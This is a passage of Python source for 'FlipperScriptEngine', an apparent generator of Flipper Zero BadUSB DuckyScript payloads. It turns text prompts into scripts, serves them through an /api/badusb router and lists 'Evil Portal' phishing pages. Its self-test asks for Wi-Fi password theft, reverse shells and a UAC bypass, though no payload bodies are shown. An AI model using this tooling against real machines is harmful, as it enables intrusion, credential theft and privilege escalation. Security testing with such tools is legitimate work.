            "description": description,
            "category":    "nlp_generated",
            "platform":    os_used,
            "template":    "nlp",
            "sd_filename": f"ERRZ_{slug}.txt",
            "prompt":      prompt,
            "os_used":     os_used,
        }

    def list_templates(self) -> dict:
        """Return all available SCRIPT_TEMPLATES with metadata."""
        return {
            k: {
                "description": v["description"],
                "platform":    v.get("platform", "cross"),
                "category":    v.get("category", "utility"),
                "tags":        v.get("tags", []),
                "author":      v.get("author", "ERR0RS"),
            }
            for k, v in SCRIPT_TEMPLATES.items()
        }

    def list_kb_repos(self) -> dict:
        """Return summary of indexed KB repos."""
        return {
            name: {
                "files": len(data["files"]),
                "tags":  data["meta"].get("tags", []),
                "type":  data["meta"].get("type", ""),
            }
            for name, data in self._indexed.items()
        }

    def get_portal_pages(self) -> list:
        """Return list of available Evil Portal HTML pages."""
        portal_repo = self._indexed.get("flipper-zero-evil-portal", {})
        htmls = [f for f in portal_repo.get("files", []) if f.endswith(".html")]
        return [
            {"path": p, "title": Path(p).stem}
            for p in htmls
        ]


# ═══════════════════════════════════════════════════════════════════════════
# handle_request — /api/badusb HTTP endpoint router
# ═══════════════════════════════════════════════════════════════════════════

def handle_request(payload: dict) -> dict:
    """
    Route handler for /api/badusb.

    Actions:
      generate   — NLP prompt → DuckyScript (primary action)
      template   — fill a named SCRIPT_TEMPLATES entry
      search     — search KB repos by keyword
      list       — list all templates + KB repos
      portals    — list Evil Portal HTML pages
      modify     — apply modification instructions to an existing script
      status     — engine health check

    All responses follow: {status, ...} where status is 'ok'|'success'|'error'
    """
    engine = FlipperScriptEngine()
    action = payload.get("action", "generate")

    # ── generate (NLP → script) ───────────────────────────────────────────
    if action == "generate":
        prompt    = payload.get("prompt", "").strip()
        target_os = payload.get("target_os", "auto")
        variables = payload.get("variables", {})
        if not prompt:
            return {"status": "error", "error": "No prompt provided"}
        return engine.generate(prompt, target_os=target_os, variables=variables)

    # ── template (named template fill) ───────────────────────────────────
    elif action == "template":
        key       = payload.get("template", "").strip()
        variables = payload.get("variables", {})
        if not key:
            return {"status": "error", "error": "No template key provided"}
        return engine.from_template(key, variables)

    # ── search KB ─────────────────────────────────────────────────────────
    elif action == "search":
        query = payload.get("prompt", payload.get("query", "")).strip()
        limit = payload.get("limit", 8)
        results = engine.search_kb(query, limit=limit)
        return {
            "status":  "ok",
            "results": [
                {
                    "repo":     r["repo"],
                    "path":     r["path"],
                    "preview":  r["preview"][:150],
                    "score":    r["score"],
                    "title":    Path(r["path"]).stem,
                    "category": "",
                    "desc":     Path(r["path"]).stem.replace("_", " "),
                }
                for r in results
            ],
        }

    # ── list templates + repos ─────────────────────────────────────────────
    elif action == "list":
        templates  = engine.list_templates()
        categories = {}
        for tmpl in templates.values():
            cat = tmpl["category"]
            categories[cat] = categories.get(cat, 0) + 1
        return {
            "status":     "ok",
            "templates":  templates,
            "total":      len(templates),
            "categories": categories,
            "kb_repos":   engine.list_kb_repos(),
        }

    # ── portals ────────────────────────────────────────────────────────────
    elif action == "portals":
        return {
            "status":  "ok",
            "portals": engine.get_portal_pages(),
        }

    # ── modify an existing script ──────────────────────────────────────────
    elif action == "modify":
        script       = payload.get("script", "").strip()
        instructions = payload.get("instructions", "").strip()
        if not script:
            return {"status": "error", "error": "No script provided to modify"}
        changes = []
        lines   = script.split("\n")
        lower_i = instructions.lower()

        if "add delay" in lower_i:
            lines.insert(1, "DELAY 1000")
            changes.append("Added DELAY 1000 after first line")
        if "remove rem" in lower_i or "strip comments" in lower_i:
            lines = [l for l in lines if not l.strip().startswith("REM")]
            changes.append("Stripped REM comment lines")
        if "add header" in lower_i or "add rem header" in lower_i:
            lines.insert(0, f"REM ERR0RS // Modified payload")
            changes.append("Added REM header")
        if "windows" in lower_i and "linux" not in lower_i:
            lines = [l.replace("GUI t", "GUI r") for l in lines]
            changes.append("Adapted open-terminal for Windows (GUI r)")
        if "linux" in lower_i and "windows" not in lower_i:
            lines = [l.replace("GUI r", "CTRL ALT t") for l in lines]
            changes.append("Adapted open-terminal for Linux (CTRL ALT t)")

        if not changes:
            changes.append("No modification rules matched — script unchanged")

        return {
            "status":  "ok",
            "script":  "\n".join(lines),
            "changes": changes,
        }

    # ── status / health check ──────────────────────────────────────────────
    elif action == "status":
        templates_count = len(SCRIPT_TEMPLATES)
        repos_count     = len(engine._indexed)
        total_files     = sum(len(d["files"]) for d in engine._indexed.values())
        return {
            "status":           "ok",
            "engine":           "FlipperScriptEngine v2.0",
            "templates":        templates_count,
            "kb_repos_indexed": repos_count,
            "kb_files":         total_files,
            "nlp_rules":        len(_NLP_RULES),
            "os_support":       list(_OS_KEYWORDS.keys()),
            "note":             "KB empty until submodules cloned" if repos_count == 0 else "KB active",
        }

    else:
        return {"status": "error", "error": f"Unknown action: {action}"}


# ── CLI self-test ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    engine = FlipperScriptEngine()
    print("=== FlipperScriptEngine self-test ===\n")
    tests = [
        ("open terminal and run a ping test", "linux"),
        ("wifi passwords",                    "windows"),
        ("reverse shell",                     "linux"),
        ("reverse shell",                     "windows"),
        ("lock screen",                       "macos"),
        ("system info",                       "linux"),
        ("uac bypass",                        "windows"),
        ("evil portal",                       "flipper"),
    ]
    for prompt, os_t in tests:
        r = engine.generate(prompt, target_os=os_t)
        print(f"[{r['status']:<16}] [{os_t:<8}] {prompt}")
        print(f"   File: {r['sd_filename']}")
        first_line = r["script"].split("\n")[0] if r["script"] else "(empty)"
        print(f"   Script: {first_line}...")
        print()
    print(f"Templates available: {len(engine.list_templates())}")
    print(f"NLP rules loaded:    {len(_NLP_RULES)}")
    print(f"KB repos indexed:    {len(engine._indexed)}")
